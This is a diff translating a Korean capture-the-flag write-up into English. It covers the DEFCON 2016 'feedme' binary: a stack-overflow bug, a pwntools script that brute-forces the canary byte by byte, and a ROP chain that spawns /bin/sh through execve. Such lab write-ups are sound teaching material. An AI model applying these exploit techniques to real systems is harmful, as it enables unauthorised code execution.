@@ -35,10 +35,10 @@ lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
 
 #### **Main(0x0804917A)**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + signal()함수를 이용해 SIGALRM을 설정합니다.
-  + 150초 후에 sigAlarm()함수가 호출되어, 해당 프로그램이 종료됩니다.
-  + Feedme()함수를 호출합니다.
+* This function performs the following operations:
+  + Sets SIGALRM using the signal() function.
+  + After 150 seconds, sigAlarm() is called and the program terminates.
+  + Calls the Service() / Feedme() function.
 
 ```c title="Main(0x0804917A)"
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -54,12 +54,12 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 #### **Service(0x080490B0)**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + fork()함수를 이용해 자식 프로세스를 생성합니다.
-  + 자식 프로세스가 정상적으로 생성되면 Feedme()함수를 실행합니다.
-  + Feedme() 함수가 종료되면 waitpid() 함수를 이용해 자식 프로세스가 종료될 때까지 대기합니다.
-    - 리턴된 값을 이용해 정상적으로 종료되었는지 확인합니다.
-  + 이러한 과정을 for()를 이용해 800번의 반복합니다.
+* This function performs the following operations:
+  + Creates a child process using the fork() function.
+  + When the child process is created successfully, it executes the Feedme() function.
+  + Once the Feedme() function finishes, it waits for the child process to terminate using waitpid().
+    - Checks whether it terminated normally using the return value.
+  + Repeats this process up to 800 times using a for loop.
 
 ```c title="Service(0x080490B0)"
 void Service()
@@ -102,16 +102,16 @@ void Service()
 
 #### **FeedMe(0x8049036)**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + UserInputNum() 함수를 이용해 숫자 값을 리턴 받습니다.
-  + UserInputStr() 함수를 이용해 사용자로 부터 문자열을 입력 받습니다.
-    - 입력받은 문자열은 buf에 저장됩니다.
-  + converter() 함수를 이용해 값을 변환 후 리턴 합니다.
-    - Int 값을 Hex 값으로 변환합니다.
-* 해당 함수에서 중요한 부분은 buf, canary 변수 입니다.
-  + buf의 크기는 32 byte 입니다.
-  + buf 다음에 canary가 선언되어 있습니다.
-  + 즉, StackOverflow가 발생하게되면 Canary 값을 확인할 수 있습니다.
+* This function performs the following operations:
+  + Receives a numeric value from the UserInputNum() function.
+  + Receives a string from user input using the UserInputStr() function.
+    - The input string is stored in buf.
+  + Converts the value using the converter() function and returns it.
+    - Converts integer values to hex.
+* The critical parts of this function are the buf and canary variables:
+  + The size of buf is 32 bytes.
+  + canary is declared immediately after buf.
+  + Thus, if a Stack Overflow occurs, the Canary value can be verified/overwritten.
 
 ```c title="FeedMe(0x8049036)"
 int __cdecl FeedMe(int argc, const char **argv, const char **envp)
@@ -136,11 +136,11 @@ int __cdecl FeedMe(int argc, const char **argv, const char **envp)
 ```
 
 #### **UserInputNum(0x8048E42)**
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + read()함수를 이용하여 사용자로 부터 한개의 문자만 입력받습니다.
-    - 입력 받은 문자는 int형으로 저장됩니다.
-    - 예를 들면 'A'를 입력했을 경우 해당 프로그램은 숫자 '65'로 사용됩니다.
-  + 입력받은 값은 return 합니다.
+* This function performs the following operations:
+  + Reads a single character from the user using the read() function.
+    - The input character is stored as an integer.
+    - For example, if 'A' is entered, it is used as the number 65 (0x41).
+  + Returns the input value.
 
 ```c title="UserInputNum(0x8048E42)"
 int UserInputNum()
@@ -156,16 +156,16 @@ int UserInputNum()
 ```
 
 #### **UserInputStr(0x8048E7E)**
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + read() 함수를 이용해 사용자로 부터 문자열을 입력받습니다.
-  + 입력받은 문자열은 buf + location 에 저장됩니다.
-* 취약성은 여기서 발생합니다.
-  + buf는 FeedMe() 함수에서 선언한 char형 변수 입니다.
-  + UserInputStr()함수는 FeedMe() 함수로 부터 buf의 주소를 전달받아 사용합니다.
-  + buf의 크기는 32byte입니다.
-  + size의 값은 UserInputNum() 함수를 이용해 32보다 큰 값을 저장할 수 있습니다.
-  + 즉, Stack Overflow가 발생하게 됩니다.
-  + 그리고 이 취약성을 이용해 해당 바이너리에 적용된 Canary의 값도 추출할 수 있습니다.
+* This function performs the following operations:
+  + Reads a string from the user using the read() function.
+  + The input string is stored in buf + location.
+* The vulnerability occurs here:
+  + buf is a char variable allocated on the stack in the FeedMe() function.
+  + UserInputStr() receives and uses the address of buf from the FeedMe() function.
+  + The size of buf is 32 bytes.
+  + However, size can be set to a value greater than 32 via UserInputNum().
+  + In other words, a Stack Overflow occurs.
+  + By leveraging this vulnerability, we can also leak the Canary value used by the binary.
 
 ```c title="UserInputStr(0x8048E7E)"
 int __cdecl UserInputStr(int buf, int number)
@@ -191,11 +191,11 @@ int __cdecl UserInputStr(int buf, int number)
 }
 ```
 
-### Debuging
+### Debugging
 
 #### **Debugging child processes**
 
-* 해당 프로그램에서 FeedMe() 함수를 자식 프로세스에서 호출합니다.
+* In this program, the FeedMe() function is called within a child process.
 
 ```c title="Service(0x080490B0)"
 void Service()
@@ -212,7 +212,7 @@ void Service()
 }
 ```
 
-* GDB를 이용해 자식 프로세스를 Debuging하기 위해서는 다음과 같은 설정이 필요합니다.
+* To debug child processes with GDB, configure the following setting:
 
 ```sh title="GDB settings"
 (gdb) set follow-fork-mode child 
@@ -223,7 +223,7 @@ Debugger response to a program call of fork or vfork is "child".
 
 #### **Check for Stack Overflow**
 
-* 다음과 같이 Break point를 설정합니다.
+* Set breakpoints as follows:
 
 ```sh title="Break point"
 (gdb) b *0x08049069
@@ -232,19 +232,19 @@ Breakpoint 1 at 0x8049063(UserInputStr)
 Breakpoint 2 at 0x804906e
 ```
 
-* Stack Overflow를 확인하기 위해 첫번째 입력 값으로 '$' 를 입력합니다.
-  + '$'는 Dec로 36을 나타냅니다.
-* 두번째 입력 값으로 문자 'A' 32개와 'B' 3개를 입력합니다.
-  + 문자 'A'는 buf공간을 채워줍니다.
-    - buf 영역 : 0xffffd26c ~ 0xffffd28c
-  + 문자 'B'는 Canary공간을 덮어씁니다.
-    - canary 영역 : 0xffffd28c
-  + - Value : 0x080490dc
-* 해당 값을 입력 하면 다음과 같은 Error가 발생합니다.
-  + 해당 에러는 canary의 값이 변경되어 발생하는 것입니다.
-  + 아래 코드에 의해 canary의 값이 변경된것을 확인합니다.
+* To confirm the Stack Overflow, pass '$' as the first input:
+  + '$' corresponds to decimal 36 (0x24).
+* For the second input, pass 32 'A's and 3 'B's:
+  + The 'A's fill the buf buffer.
+    - buf area: 0xffffd26c ~ 0xffffd28c
+  + The 'B's overwrite the Canary area.
+    - canary area: 0xffffd28c
+  + Value: 0x080490dc
+* Passing these values triggers the following error:
+  + This error occurs because the canary value has been corrupted.
+  + The following code detects the canary corruption:
   - "v6 = \*MK\_FP(\_\_GS\_\_, 20) ^ canary;"
-* 즉, Canary 값만 Leak 할 수 있으면 return addresss를 덮어쓸수 있습니다.
+* Therefore, if we can leak the Canary value, we can overwrite the return address.
 
 ```sh title="Check for Stack Overflow"
 (gdb) r
@@ -287,12 +287,12 @@ Program received signal SIGABRT, Aborted.
 
 ### Canary Leak
 
-* 앞에서 확인한 StackOverflow 취약성을 이용해 Canary 값을 추출할 수 있습니다.
-* 한번 생성된 Canary는 프로그램이 종료되기 전까지 변경되지 않기 때문에 가능합니다.
-* 다음과 같은 코드를 이용해 Canary 값을 확인할 수 있습니다.
-  + 1byte씩 Canary 값을 추출합니다.
-    - Canary의 크기는 4바이트 입니다.
-  + 1byte에 입력되는 값의 범위는 0x00 ~ 0xff입니다.
+* Using the Stack Overflow vulnerability identified above, we can leak the Canary value.
+* This works because the child processes share the same Canary value generated by the parent process until the program terminates.
+* The following script can be used to leak the Canary value:
+  + Leaks the Canary byte by byte (1 byte at a time).
+    - The Canary size is 4 bytes.
+  + The tested byte range is 0x00 ~ 0xff.
 
 ```python title="Canary Leak"
 from pwn import *
@@ -316,34 +316,34 @@ log.info("CANARY : " + canary.encode("hex"))
 
 ### Structure of Exploit code
 ```
-1. read()함수를 이용하여 사용자로 부터 값을 입력 받고, WRITE권한이 있는 공간에 사용자 입력값을 저장합니다.
-2. execve()함수를 이용하여 사용자가 입력한 값을 실행하도록 합니다.
+1. Use the read() function to receive input from the user and store it in a memory region with WRITE permissions.
+2. Use the execve() function to execute the command provided by the user.
 ```
 * The following information is required for an attack:
 ```
-* 사용자 입력값을 저장할 메모리 공간
-* shellcode 작성
-* ROP gadget
+* Memory area to store user input
+* Shellcode / command string setup
+* ROP gadgets
 ```
 ### **Information for attack**
 
 #### **ROP design**
 
-* 해당 프로그램의 취약점을 통해 Shell을 획득하기 위해 다음과 같은 코드를 사용할 예정입니다.
+* To obtain a shell via the program's vulnerability, we will use the following flow:
 
-  + UserInputStr()를 이용해 사용자로 부터 문자열("/bin/sh\n")을 입력받아 지정된 주소에 저장합니다.
-  + execve()함수의 첫번째 인자로 문자열이 저장된 주소를 전달합니다.
+  + Use UserInputStr() to read a command string ("/bin/sh\0") from the user and store it at a designated memory address.
+  + Pass the address where the string is stored as the first argument to the execve() system call.
 
 ```python title="ROP design"
-sub_8048E7E("사용자 입력 값을 저장할 메모리 주소",10)
-execve("사용자 입력 값을 저장할 메모리 주소",0,0)
+sub_8048E7E("Memory address to store user input", 10)
+execve("Memory address to store user input", 0, 0)
 ```
 
-#### **사용자 입력값을 저장할 메모리 공간**
+#### **Memory space to store user input**
 
-* 사용자 입력값을 저장할 메모리 공간이 필요합니다.
-* readelf를 이용하여 해당 파일의 "Section Headers" 정보를 확인합니다.
-  + Write권한이 있는 .bss영역, .data영역, 등등을 사용할 수 있습니다.
+* A writable memory space is required to store the user input.
+* Check the "Section Headers" of the file using readelf:
+  + Sections with Write permissions, such as .bss, .data, etc., can be used.
 
 ```sh title="readelf -S feedme"
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ readelf -S feedme 
@@ -385,15 +385,15 @@ Key to Flags:
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
 ```
 
-* 해당 바이너리를 실행 후, 메모리 맵을 보면 다음과 같은 정보를 알 수 있습니다.
-  + 해당 바이너리에서 Write권한 설정되어 있는 메모리 영역은 "0x080e9000-0x080eb000" 입니다.
-  + Section header 정보와 비교해 보면 "0x080e9000" ~ "0x080e9f40" 영역까지는 빈공간입니다.
-  + 빈공간이라고 판단할수 있는 이유는 다음과 같습니다.
-    - .gcc\_except\_table은 0x080e89f4 부터 C2만큼의 공간을 사용하고 있습니다.
-      * 0x080e89f4 + 0xc2 = 0x80e8ab6
-    - .tdata 영역은 0x080e9f40부터 시작합니다.
-      * 0x080e9f40 - 0x80e8ab6 = 0x148a
-* 0x080e9000 영역에 사용자 입력 값을 저장하겠습니다.
+* Inspecting the memory map after executing the binary reveals the following:
+  + The memory region with Write permissions in this binary is "0x080e9000-0x080eb000".
+  + Comparing this with the Section Header info, the range from "0x080e9000" to "0x080e9f40" is unused space.
+  + We can determine it is empty/unused based on the following:
+    - .gcc\_except\_table uses 0xc2 bytes starting from 0x080e89f4.
+      * 0x080e89f4 + 0xc2 = 0x80e8ab6
+    - The .tdata section begins at 0x080e9f40.
+      * 0x080e9f40 - 0x80e8ab6 = 0x148a
+* We will store the user input at address 0x080e9000.
 
 ```sh title="cat /proc/{PID}/maps"
 (gdb) shell cat /proc/2627/maps
@@ -408,11 +408,10 @@ bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
 
 #### **ROP gadget - UserInputStr(system call)**
 
-* UserInputStr() 함수의 호출방식은 system call 형태로 호출됩니다.
-* 그렇기 때문에 인자 값을 전달하기 위해 "pop esi ; pop edi ; ret ;" Gadget이 필요합니다.
-* 다음과 같은 방법으로 Gadget을 찾을 수 있습니다.
-
-  + 사용할 주소는 0x0809e11c 입니다.
+* The UserInputStr() function is called using standard cdecl conventions.
+* Therefore, a "pop esi ; pop edi ; ret ;" gadget is required to clear arguments off the stack.
+* You can locate the gadget as follows:
+  + We can use the gadget at 0x0804846e.
 
 ```sh title="ROP Gadget - UserInputStr(system call)"
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 2 |grep "pop esi ; pop edi ; ret "
@@ -423,18 +422,18 @@ lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 2 |
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
 ```
 
-#### **ROP gadget - execve(int 0x80, interrupt 0x80)**
+#### **ROP gadget - execve(int 0x80, interrupt 0x80)**
 
-* execve() 함수의 경우 "int 0x80" 명령어를 이용해 호출하기 때문에 사용되는 레지스터가 다릅니다.
-  + 인자을 전달하기 위해 "pop eax", "pop ebx", "pop ecx", "pop edx" 명려어가 포함된 Gadget이 필요합니다.
-  + 하지만 해당 명령어를 모두 포함하고 있는 Gadget은 해당 바이너리에 존재하지 않습니다.
+* In the case of execve(), since it is invoked via the "int 0x80" instruction, registers are used for arguments.
+  + To pass arguments, gadgets containing "pop eax", "pop ebx", "pop ecx", and "pop edx" are needed.
+  + However, a single gadget containing all of these instructions does not exist in the binary.
 
 ```sh title="ROP Gadget - pop eax ; pop ebx ; pop ecx ; pop edx ;"
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 5 |grep "pop eax ; pop ebx ; pop ecx ; pop edx ;"
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
 ```
 
-* 다음과 같이 execve call number를 저장할 수 있는 Gadget도 찾을 수 있습니다.
+* We can find a gadget to load the execve syscall number into eax:
 
 ```sh title="ROP Gadget - pop eax ; ret"
 lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 1 |grep "pop eax ; ret  ;"
@@ -445,7 +444,7 @@ lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 1 
 lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
 ```
 
-* 다음과 같이 인자 값을 전달할 수 있는 Gadget도 찾을 수 있습니다.
+* We can also find a gadget to set the argument registers:
 
 ```sh title="ROP Gadget - pop edx ; pop ecx ; pop ebx ; ret"
 lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 3 |grep "pop edx ; pop ecx ; pop ebx ; ret  ;"
@@ -453,7 +452,7 @@ lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 3 
 lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
 ```
 
-* 그리고 execve 함수의 실행하기 위해 "int 0x80" Gadget이 필요합니다.
+* And an "int 0x80" gadget is required to trigger the execve system call:
 
 ```sh title="ROP Gadget - 'int 0x80'"
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 0 |grep "int 0x80"
@@ -463,15 +462,15 @@ lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 0 |
 lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
 ```
 
-* 앞에서 확인한 정보를 이용하여 ROP 작성하면 다음과 같이 작성할 수 있습니다.
+* Constructing the ROP chain with the identified information gives the following:
 
 ```python title="ROP Chain"
-#sub_8048E7E("사용자 입력 값을 저장할 메모리 주소",10)
+#sub_8048E7E("Memory address to store user input", 10)
 payload += p32(0x08048E7E)	# 0x08048E7E
 payload += p32(0x0804846e)	# POP esi ; POP edi ; ret;
 payload += p32(0x080e9000)	# Arg1 : 0x080e9000
 payload += p32(10)			# Arg2 : 10
-#execve("사용자 입력 값을 저장할 메모리 주소",0,0)
+#execve("Memory address to store user input", 0, 0)
 payload += p32(0x0806f370)	# POP edx ; POP ecx ; POP ebx ; ret ;
 payload += p32(0)
 payload += p32(0)
@@ -482,11 +481,11 @@ payload += p32(11)			# execve call number
 payload += p32(0x08049761)	# int 0x80;
 ```
 
-#### **확인 내용 정리**
+#### **Summary of Key Information**
 
-```txt title="공격에 사용될 정보"
-* 사용자 입력값을 저장할 메모리 공간 : 0x080e9000
-* ROP gadget
+```txt title="Information used for attack"
+* Memory space to store user input: 0x080e9000
+* ROP gadgets
   * "pop esi ; pop edi ; ret ;" : 0x0804846e
   * "pop edx ; pop ecx ; pop ebx ; ret ;" : 0x0806f370
   * "pop eax ; ret ;" : 0x080bb496
